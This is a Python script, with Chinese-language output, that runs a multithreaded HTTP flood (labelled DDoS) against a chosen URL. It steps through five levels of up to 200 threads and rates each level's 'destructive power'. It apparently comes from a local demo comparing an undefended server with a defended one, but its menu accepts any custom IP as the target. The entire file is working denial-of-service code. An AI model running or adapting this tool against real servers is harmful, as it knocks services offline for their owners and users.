"""
快速測試腳本 - 不同強度的攻擊對比
"""
import requests
import threading
import time
import socket

def get_local_ip():
    """獲取本機局域網IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class QuickDDoS:
    def __init__(self, url):
        self.url = url
        self.count = 0
        self.lock = threading.Lock()
        self.running = True
    
    def attack(self):
        while self.running:
            try:
                requests.get(self.url, timeout=2)
                with self.lock:
                    self.count += 1
            except:
                pass
    
    def run(self, threads, duration, name):
        self.count = 0
        self.running = True
        
        print(f"\n{'='*60}")
        print(f"🎯 {name}")
        print(f"線程: {threads} | 時間: {duration}秒")
        print(f"{'='*60}")
        
        start = time.time()
        thread_list = []
        
        for _ in range(threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        self.running = False
        time.sleep(1)
        
        elapsed = time.time() - start
        rate = self.count / elapsed
        
        print(f"✅ 完成: {self.count} 請求 | {rate:.1f} req/s")
        
        # 評級
        if rate > 500:
            level = "🔥🔥🔥 毀滅級"
        elif rate > 200:
            level = "🔥🔥 嚴重級"
        elif rate > 100:
            level = "🔥 中等級"
        else:
            level = "💨 輕微級"
        
        print(f"威力: {level}\n")
        return rate

def main():
    print("""
    ╔══════════════════════════════════════════════╗
    ║     快速攻擊威力測試 - 不同層級對比        ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # 自動檢測IP
    local_ip = get_local_ip()
    
    print(f"📍 攻擊來源IP: {local_ip}")
    print(f"🎯 可用伺服器:")
    print(f"   [1] 無防禦: http://{local_ip}:8000")
    print(f"   [2] 有防禦: http://{local_ip}:8001")
    
    choice = input("\n選擇目標 (1/2/自定義IP): ").strip()
    
    if choice == '1':
        url = f"http://{local_ip}:8000"
        print(f"\n✅ 目標: 無防禦伺服器 (8000)")
    elif choice == '2':
        url = f"http://{local_ip}:8001"
        print(f"\n✅ 目標: 有防禦伺服器 (8001)")
    elif choice:
        url = f"http://{choice}:8000"
        print(f"\n✅ 目標: {url}")
    else:
        url = f"http://{local_ip}:8001"
        print(f"\n✅ 目標: 有防禦伺服器 (預設)")
    
    print(f"💡 攻擊配置: 來源IP({local_ip}) → 目標({url})\n")
    
    ddos = QuickDDoS(url)
    
    tests = [
        (10, 5, "💨 Level 1: 輕量級攻擊 (10線程)"),
        (30, 5, "⚡ Level 2: 標準攻擊 (30線程)"),
        (50, 5, "🔥 Level 3: 高強度攻擊 (50線程)"),
        (100, 5, "💥 Level 4: 超高強度攻擊 (100線程)"),
        (200, 5, "☠️  Level 5: 毀滅性攻擊 (200線程)"),
    ]
    
    print("開始測試 (共5個級別,每級5秒)\n")
    time.sleep(2)
    
    results = []
    for threads, duration, name in tests:
        rate = ddos.run(threads, duration, name)
        results.append((name, rate))
        time.sleep(2)
    
    # 總結
    print("="*60)
    print("📊 測試總結")
    print("="*60)
    for name, rate in results:
        print(f"{name}: {rate:.1f} req/s")
    print("="*60)
    print("\n💡 建議:")
    print("  - Level 1-2: 網頁會變慢")
    print("  - Level 3-4: 網頁嚴重卡頓")
    print("  - Level 5: 可能無法載入")

if __name__ == '__main__':
    main()
